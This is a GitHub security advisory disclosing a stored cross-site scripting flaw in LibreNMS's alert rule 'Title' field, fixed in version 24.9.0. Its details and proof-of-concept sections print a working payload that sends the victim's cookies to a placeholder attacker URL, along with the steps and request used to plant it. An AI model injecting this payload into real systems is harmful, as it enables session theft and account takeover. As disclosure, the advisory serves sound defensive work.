# Stored XSS ('Cross-site Scripting') in librenms/includes/html/print-alert-rules.php

High

[murrant](/murrant)
published
GHSA-j2j9-7pr6-xqwv
Oct 1, 2024

## Package

librenms/includes/html/print-alert-rules.php
(LibreNMS)

## Affected versions

<= 24.7.0

## Patched versions

24.9.0

## Description

### Summary

A Stored Cross-Site Scripting (XSS) vulnerability in the "Alert Rules" feature allows authenticated users to inject arbitrary JavaScript through the "Title" field. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions.

### Details

The vulnerability occurs when creating an alert rule. The application does not properly sanitize user inputs in the "Title" field, which allows an attacker to escape the attribute context where the title is injected (data-content). Despite some character restrictions, the attacker can still inject a payload that leverages available attributes on the div element to execute JavaScript automatically when the page loads.

For example, the following payload can be used:

`test1'' autofocus onfocus="document.location='https://<attacker-url>/logger.php?c='+document.cookie"`

This payload triggers the XSS when the affected page is loaded, automatically redirecting the user to the attacker's controlled domain with any non-httponly cookies present.

The vulnerability stems from the application not sanitizing the value of $rule['name'] before adding it to the $enabled\_msg variable. This is evident in the code:

[librenms/includes/html/print-alert-rules.php](https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405)

Line 405
in
[9455173](/librenms/librenms/commit/9455173edce6971777cf6666d540eeeaf6201920)

|  | $enabled\_msg = $rule['name'] . ' is ON'; |
| --- | --- |

### PoC

1. Create a new alert rule in the LibreNMS interface.
2. In the "Title" field, input the following payload:

   `test1'' autofocus onfocus="document.location='https://<attacker-url>/logger.php?c='+document.cookie"`
3. Save the rule and trigger the alert.
4. Observe that when the page loads, the injected JavaScript executes and redirects the user, sending their non-httponly cookies to the attacker's server.

Example Request:

```
POST /ajax_form.php HTTP/1.1
Host: <your_host>
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: <your_XSRF_token>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: <your_cookie>

```
### Impact

It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
